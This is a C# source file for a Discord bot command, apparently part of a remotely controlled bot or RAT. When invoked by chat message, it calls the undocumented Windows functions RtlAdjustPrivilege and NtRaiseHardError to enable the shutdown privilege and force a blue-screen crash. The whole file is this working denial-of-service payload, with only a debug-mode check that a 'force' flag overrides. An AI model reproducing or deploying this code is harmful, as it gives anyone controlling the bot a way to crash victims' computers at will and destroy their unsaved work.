using Discord;
using Discord.Commands;
using System.Runtime.InteropServices;

namespace Main.Source.Bot.Commands
{
    public class BlueScreen : CommandBase
    {
        [DllImport("ntdll.dll")]
        public static extern uint RtlAdjustPrivilege(
            int Privilege,
            bool EnablePrivilege,
            bool IsThreadPrivilege,
            out bool PreviousValue
        );

        [DllImport("ntdll.dll")]
        private static extern IntPtr NtRaiseHardError(
            uint ErrorStatus,
            uint NumberOfParameters,
            uint UnicodeStringParameterMask,
            IntPtr Parameters,
            uint ValidResponseOption,
            out uint Response
        );

        public override string Name => "bsod";
        public override string Info => "Triggers the blue screen of death";
        public override string Use => "No usage";

        public override async Task Func(SocketCommandContext socket, string[] args)
        {
            string arguments = string.Join(" ", args);
            if (ConfigMisc.DEBUG_MODE && !Utilities.Parser.GetFlag(arguments, "force"))
            {
                await socket.Message.ReplyAsync($"Cannot run command while in debug mode without force flag");
                return;
            }

            bool prev = false;
            uint res = 0;

            RtlAdjustPrivilege(19, true, false, out prev);
            NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out res);
        }
    }
}
